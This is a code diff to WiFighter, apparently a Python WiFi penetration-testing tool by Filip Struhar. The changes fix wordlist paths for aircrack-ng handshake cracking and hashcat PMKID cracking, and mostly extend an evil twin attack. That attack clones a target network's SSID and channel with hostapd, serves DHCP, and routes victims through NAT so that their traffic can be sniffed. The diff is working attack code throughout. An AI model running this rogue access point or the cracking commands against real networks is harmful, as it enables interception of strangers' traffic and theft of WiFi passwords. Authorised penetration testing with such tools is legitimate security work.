@@ -63,8 +63,8 @@ def introduction():
      print()
      print(f"{BLUE}Welcome :D This is WiFighter!{RESET}")
      print(f"{BLUE}Easy-to-use WiFi pen-testing security tool{RESET}")
-     print(" ")
-     print(f"{MAGENTA}Developed by Filip Struhar | https://github.com/FilipStruhar{RESET}")
+     #print(" ")
+     #print(f"{MAGENTA}Developed by Filip Struhar | https://github.com/FilipStruhar{RESET}")
 
      print()
      print()
@@ -228,7 +228,7 @@ def monitor_switch(verbose, command, interface, channel):
           print(f'{RED}Interface "{interface}" does not exist! Retype "wifighter [start/stop/status] [-INTERFACE_NAME-]"{RESET}')
 
 
-def list_interfaces():
+def list_interfaces(verbose):
      detected_interfaces = []
 
      # Get wireless interfaces array
@@ -242,10 +242,14 @@ def list_interfaces():
           print(f"{RED}Error executing 'iw dev': {e}{RESET}")
 
      if detected_interfaces:
-          for interface in detected_interfaces:
-               print(f"{CYAN}{interface}{RESET}")
+          if verbose:
+               for interface in detected_interfaces:
+                    print(f"{CYAN}{interface}{RESET}")
      else:
-          print(f'{RED}No wireless interfaces found!{RESET}')
+          if verbose:
+               print(f'{RED}No wireless interfaces found!{RESET}')
+
+     return detected_interfaces # Provide some functions with detected wireless interfaces
 #---------------------------------
 
  # | CHOOSING | #
@@ -863,7 +867,7 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
      if wordlist:
           try:
                print(f"{CYAN}[>]{RESET} Cracking handshake with aircrack-ng (CPU) using {wordlist}")
-               command = ['sudo', 'aircrack-ng', '-w', f'wordlists/{wordlist}', f'{output_dir}/{output_file}']
+               command = ['sudo', 'aircrack-ng', '-w', f'{wifighter_path}/wordlists/{wordlist}', f'{output_dir}/{output_file}']
                crack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                output = str(crack.communicate())
 
@@ -984,9 +988,9 @@ def pmkid_attack(target_ap, interface, target):
           try:
                print(f"{CYAN}[>]{RESET} Cracking PMKID with hashcat (CPU) using {wordlist}")
                if file_num:
-                    command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash-{file_num}', f'wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked-{file_num}.txt']
+                    command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash-{file_num}', f'{wifighter_path}/wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked-{file_num}.txt']
                else:
-                    command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash', f'wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked.txt']
+                    command = ['sudo', 'hashcat', '-D', '1', '-a', '0', '-m', '22000', '--potfile-path=/dev/null', f'{output_dir}/pmkid_hash', f'{wifighter_path}/wordlists/{wordlist}', '-o', f'{output_dir}/pmkid_cracked.txt']
                crack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                output = str(crack.communicate())
 
@@ -1097,6 +1101,8 @@ def jam_network(target_ap, interface, jammer_mode):
 def evil_twin(target_ap, interface, target):
      # Prepare variables
      ssid = target_ap['SSID'] if target_ap['SSID'] else None
+     channel = target_ap['Channel'] if target_ap['Channel'] else None
+     band = target_ap['Band'] if target_ap['Band'] else None
 
      def choose_evil_interfaces(detected_interfaces):
           print(f"Select Interfaces:\n")
@@ -1117,7 +1123,7 @@ def evil_twin(target_ap, interface, target):
                     except ValueError:
                          print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
 
-          evil_interface = select_interface("Wireless interface number for fake AP")
+          evil_interface = select_interface("Wireless interface number for Evil Twin AP")
           internet_interface = select_interface("Internet interface number")
 
           return evil_interface, internet_interface
@@ -1138,6 +1144,13 @@ def evil_twin(target_ap, interface, target):
                print(f"{RED}Error running ping: {e}{RESET}")
                return False
 
+     def is_wireless(interface):
+          detected_interfaces = list_interfaces(None)
+          if interface in detected_interfaces:
+               return True
+          else:
+               return False
+
      if ssid:
           detected_interfaces = []
 
@@ -1145,22 +1158,28 @@ def evil_twin(target_ap, interface, target):
           print(f"{CYAN}| Evil Twin (MITM/Sniffer) |{RESET}\n")
 
           try:
-               # Run 'ip -o link show' to get interface details
+               # Get available interface names, exclude "lo"
                result = subprocess.run(["ip", "-o", "link", "show"], capture_output=True, text=True, check=True)
-
-               # Extract interface names using regex
                detected_interfaces = [iface for iface in re.findall(r'^\d+: ([^:]+):', result.stdout, re.MULTILINE) if iface != "lo"]
           except subprocess.CalledProcessError as e:
                print(f"{RED}Error executing 'ip -o link show': {e}{RESET}")
 
+          # Prepare interfaces variables
           if detected_interfaces:
+               # Male sure atleast 2 interfaces available
                if len(detected_interfaces) > 1:
                     internet_conn = False
                     while internet_conn == False:
                          evil_interface, internet_interface = choose_evil_interfaces(detected_interfaces)
+                         # Check if chosen interfaces aren't matching
                          if evil_interface == internet_interface:
                               print(f"{RED}Interfaces can't match!{RESET}\n")
                               continue
+                         # Check if chosen evil interface is wireless
+                         if not is_wireless(evil_interface):
+                              print(f"{RED}Interface for Evil Twin AP must be wireless one!{RESET}\n")
+                              continue
+                         # Check if chosen internet interface has internet connection and DNS resolution is working properly
                          internet_conn = check_internet(internet_interface)
                else:
                     print(f"{RED}You need atleast 2 network interfaces in order to run this attack!{RESET}")
@@ -1169,6 +1188,7 @@ def evil_twin(target_ap, interface, target):
                logo()
                print(f"{CYAN}| Evil Twin (MITM/Sniffer) |{RESET}\n")
 
+               # Function for running commands
                def run_command(command):
                     try:
                          subprocess.run(command, shell=True, check=True)
@@ -1176,33 +1196,32 @@ def evil_twin(target_ap, interface, target):
                          print(f"{RED}Error running command: {e}{RESET}")
                
 
+               # Setup DHCP server
                dhcpd_config_file = "/etc/sysconfig/dhcpd"
-               # Read the existing configuration
+               
                with open(dhcpd_config_file, "r") as f:
-                    lines = f.readlines()
+                    lines = f.readlines() # Read the existing configuration
                interface_line = f'DHCPD_INTERFACE="{evil_interface}"\n'
                updated_lines = []
                found = False
 
-               # Check if the line exists and replace it
                for line in lines:
-                    if line.startswith("DHCPD_INTERFACE="):
+                    # Check if the line exists and replace it
+                    if line.startswith("DHCPD_INTERFACE="): 
                          updated_lines.append(interface_line)
                          found = True
                     else:
                          updated_lines.append(line)
-
-               # If the line wasn't found, add it at the end
+ 
                if not found:
-                    updated_lines.append(interface_line)
-
-               # Write the updated configuration back
+                    updated_lines.append(interface_line) # If the line wasn't found, add it at the end
+               
                with open(dhcpd_config_file, "w") as f:
-                    f.writelines(updated_lines)
+                    f.writelines(updated_lines) # Write the updated configuration back
 
 
 
-               # Step 2: Configure DHCP Server's Settings
+               # Configure DHCP server's settings
                dhcpd_conf_file = "/etc/dhcpd.conf"
                with open(dhcpd_conf_file, "w") as f:
                     f.write(textwrap.dedent("""\
@@ -1219,27 +1238,28 @@ subnet 192.168.100.0 netmask 255.255.255.0 {
                     """))
                print(f'{CYAN}[>]{RESET} DHCPD configuration set')
 
-               # Step 3: Configure Evil AP's Settings
+               # Configure Evil AP's Settings
                hostapd_conf_file = "/etc/hostapd.conf"
+               if band == "5 GHz": # Handle 5GHz networks - not supported
+                    channel = '1'
                with open(hostapd_conf_file, "w") as f:
                     f.write(textwrap.dedent(f"""\
 interface={evil_interface}
 driver=nl80211
 ssid={ssid}
-channel=1
+channel={channel}
 hw_mode=g
 ieee80211n=1
 wme_enabled=1
 macaddr_acl=0
-auth_algs=1
                     """))
                print(f'{CYAN}[>]{RESET} Hostapd configuration set')
 
-               # Step 4: Set up the Evil AP's Interface
+               # Add static IP on Evil AP's interface
                run_command(f"sudo ip addr add 192.168.100.1/24 dev {evil_interface}")
                print(f'{CYAN}[>]{RESET} Evil Twin AP interface {evil_interface} configured')
 
-               # Step 5: Enable Internet Connection for Clients
+               # Enable internet connection for clients
                run_command(f"sudo iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -o {internet_interface} -j MASQUERADE")
                run_command(f"sudo iptables -A FORWARD -i {evil_interface} -o {internet_interface} -j ACCEPT")
                run_command(f"sudo iptables -A FORWARD -i {internet_interface} -o {evil_interface} -m state --state RELATED,ESTABLISHED -j ACCEPT")
@@ -1247,18 +1267,32 @@ auth_algs=1
                run_command("sudo echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
                print(f'{CYAN}[>]{RESET} IP forwarding enabled')
 
-               # Step 6: Prevent NetworkManager from managing the Evil AP's interface
+               # Prevent NetworkManager from managing the Evil AP's interface
                run_command(f"sudo nmcli dev set {evil_interface} managed no")
                print(f'{CYAN}[>]{RESET} NetworkManager disabled for interface "{evil_interface}"')
 
-               # Step 7: Restart Services to Apply Configuration
+               # Start dhcp server
                print(f'{CYAN}[>]{RESET} Starting DHCP server for Evil Twin clients\n')
                run_command("sudo systemctl restart dhcpd")
-               print(f'{CYAN}[>]{RESET} Starting Evil Twin AP - You can sniff caught clients traffic on "{evil_interface}" using tools like wireshark, tshark or tcpdump!!')
+
+
+               print(f'{CYAN}[>]{RESET} Starting Evil Twin AP - SSID: "{ssid}"')
+               print(f'You can sniff caught clients traffic on "{evil_interface}" using tools like wireshark, tshark or tcpdump!!')
+               # Run the Evil Twin AP
                run_command("sudo hostapd /etc/hostapd.conf")
                
+               # Restore everything
+               print(f'\n{CYAN}[>]{RESET} Restoring configurations')
+               run_command("sudo systemctl stop dhcpd")
+               run_command("sudo iptables -F")
+               run_command("sudo iptables -t nat -F")
+               run_command("sudo echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
+               run_command(f"sudo nmcli dev set {evil_interface} managed yes")
+               run_command(f"sudo ip addr del 192.168.100.1/24 dev {evil_interface}")
+               run_command("sudo systemctl restart NetworkManager")
+
      else:
-          print(f"{RED}Target AP doesn't have SSID set!{RESET}")
+          print(f"{RED}\nTarget AP doesn't have SSID set!{RESET}")
 
 #------------------------------------------------------------------------------------
 
@@ -1277,7 +1311,7 @@ if cmd_lenght > 1:
      if cmd_lenght == 2:
           command = sys.argv[1].lower()
           if command == "list":
-               list_interfaces()
+               list_interfaces('verbose')
                print()
           elif command == "wake":
                start_services('verbose')
